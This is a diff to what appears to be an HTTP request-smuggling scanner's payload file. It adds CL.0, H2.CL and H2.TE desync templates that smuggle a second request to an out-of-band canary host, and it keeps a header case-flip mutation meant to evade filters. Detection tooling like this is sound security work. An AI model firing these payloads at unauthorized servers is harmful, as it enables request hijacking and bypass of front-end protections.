@@ -31,6 +31,18 @@ payloads:
     template: "GET /{canary} HTTP/1.1\r\nHost: {oast_host}\r\n"
     confidence: confirmed
     notes: Smuggled second-request canary; OAST hit confirms desync.
+  - id: cl_zero_desync
+    template: "Content-Length: 35\r\n\r\nGET /{canary} HTTP/1.1\r\nHost: {oast_host}\r\n\r\n"
+    confidence: likely
+    notes: "CL.0 desync: the front-end honors Content-Length while the back-end ignores the declared body and parses it as a new request, confirmed by an OAST hit on the smuggled canary path."
+  - id: h2_cl_downgrade
+    template: "content-length: 0\r\n\r\nGET /{canary} HTTP/1.1\r\nHost: {oast_host}\r\n\r\n"
+    confidence: suspected
+    notes: "H2.CL downgrade: a content-length injected into an HTTP/2 message is honored by the HTTP/1.1 origin after the edge re-serializes it, making trailing bytes a smuggled request, confirmed by an OAST hit on the canary path."
+  - id: h2_te_downgrade
+    template: "transfer-encoding: chunked\r\n\r\n0\r\n\r\nGET /{canary} HTTP/1.1\r\nHost: {oast_host}\r\n\r\n"
+    confidence: suspected
+    notes: "H2.TE downgrade: a transfer-encoding that survives the HTTP/2-to-HTTP/1.1 downgrade lets the origin read the chunk terminator and treat following bytes as a smuggled request, confirmed by an OAST hit on the canary path."
 mutations:
   - name: case_flip
     description: Header-name case flips defeat substring filters on TE/CL.
